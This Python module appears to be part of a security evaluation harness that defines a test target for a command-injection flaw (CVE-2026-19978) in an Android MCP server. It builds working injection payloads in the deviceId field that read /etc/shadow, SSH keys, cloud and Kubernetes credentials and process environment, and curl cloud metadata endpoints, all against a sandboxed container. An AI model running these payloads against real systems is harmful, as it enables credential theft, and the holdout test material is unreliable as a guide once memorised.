"""CVE-2026-19978: OS command injection in jiantao88/android-mcp-server (CWE-78).

The vulnerable server (commit cfb872b) builds `"${adbPath}" -s ${deviceId} ${command}` in
executeAdbCommand and runs it through child_process.exec (a shell), so a deviceId carrying shell
metacharacters runs an arbitrary host command whose stdout is returned in the tool response. The
first fixed commit (14e2bf2) runs adb through execFile with an argument vector, so the same
deviceId becomes an inert serial.

The flaw is general command execution, so the exploit surfaces a planted nonce from every place
the executed command can reach and the server does not read itself. Each exploit is one
list-packages call whose deviceId injects `… ; <read the place> ; true`; the leading
`zzz >/dev/null 2>&1` swallows the `adb -s` noise and the trailing `true` eats the appended
`shell pm list packages` so the shell exits 0 with the read on stdout.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Coordinates, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

WORKDIR = "/app"

# command_execution-reachable, plantable places the server does not read itself.
KEPT_PLACES: tuple[str, ...] = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
    "etc-hosts",
    "auth-log",
)

# Every exploit deviceId carries the `; ` command separator; the benign get-devices call does not.
AIM = re.compile(r";\s")


def _injection(read_cmd: str) -> str:
    return f"zzz >/dev/null 2>&1 ; {read_cmd} ; true"


def _read_cmd(coord: Coordinates) -> str:
    if coord.kind is PlantKind.FILE:
        paths = coord.paths if coord.paths is not None else (coord.path,)
        container_paths = [resolve_container_path(p, WORKDIR) for p in paths if p is not None]
        redir = " 2>/dev/null" if len(container_paths) > 1 else ""
        return "cat " + " ".join(container_paths) + redir
    if coord.kind is PlantKind.ENV:
        # /proc/self/environ carries every exported variable, the planted nonce among them.
        return "cat /proc/self/environ"
    if coord.kind is PlantKind.ACCOUNT:
        return "id -un"
    if coord.kind is PlantKind.HOSTNAME:
        return "cat /etc/hostname"
    if coord.kind is PlantKind.HTTP_ENDPOINT:
        return f"curl -s http://{coord.host}{coord.path}"
    raise ValueError(f"no command-execution read for kind {coord.kind}")


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        device_id = _injection(_read_cmd(places[place_id].coordinates))
        await client.call_tool("list-packages", {"deviceId": device_id})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("get-devices", {"showDetails": True})


TARGET = CVETarget(
    cve_id="CVE-2026-19978",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-19978-android",),
    server_image="holdout-2026-19978-android",
    patched_image="holdout-2026-19978-android-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKDIR, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection (CWE-78): executeAdbCommand interpolates the attacker-controlled "
        "deviceId into an `adb -s <deviceId> ...` line run through child_process.exec, so a "
        "deviceId carrying shell metacharacters executes an arbitrary command in the server's "
        "container."
    ),
    tools_filter=None,
    ci_skip_reason=None,
)
